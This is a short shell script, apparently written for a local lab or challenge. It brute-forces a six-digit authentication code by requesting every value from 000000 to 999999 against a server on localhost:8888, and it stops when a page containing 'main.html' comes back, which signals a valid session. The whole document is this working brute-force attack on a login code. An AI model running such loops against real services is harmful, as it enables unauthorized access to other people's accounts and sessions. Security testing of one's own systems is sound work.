
# Brute-forces the 6-digit auth code to find a working session

for i in $(seq -w 000000 999999); do
  curl -s "http://localhost:8888/$i/" | grep -q "main.html" && echo "Found code: $i" && break
done
